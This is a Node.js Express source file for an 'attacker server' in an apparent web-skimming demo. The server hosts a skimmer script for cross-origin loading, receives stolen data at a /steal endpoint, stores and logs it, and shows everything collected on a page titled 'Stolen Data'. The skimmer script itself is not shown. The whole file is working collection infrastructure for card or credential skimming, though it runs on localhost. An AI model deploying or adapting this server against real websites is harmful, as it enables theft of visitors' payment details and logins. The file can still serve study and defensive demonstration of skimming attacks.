// attacker-server/attacker-server.js
const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 4000;

// Serve the skimmer script
app.use(express.static(path.join(__dirname, 'public')));

// Accept all payloads as text
app.use(bodyParser.text({ type: '*/*' }));

// CORS so it can be loaded cross-origin
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  next();
});

let stolen = [];

// Skimmer POST endpoint
app.post('/steal', (req, res) => {
  let data;
  try {
    data = JSON.parse(req.body);
  } catch (e) {
    data = { raw: req.body };
  }

  const entry = { time: new Date().toISOString(), data };
  stolen.push(entry);
  console.log('💥 Stolen data:', entry);
  res.status(204).end();
});

// UI to view stolen data
app.get('/', (req, res) => {
  res.send(`
    <html><body style="font-family:sans-serif;padding:2rem;">
      <h1>🕵️ Stolen Data</h1>
      <pre>${JSON.stringify(stolen, null, 2)}</pre>
    </body></html>
  `);
});

app.listen(PORT, () =>
  console.log(`⚠️  Attacker server running at http://localhost:${PORT}`)
);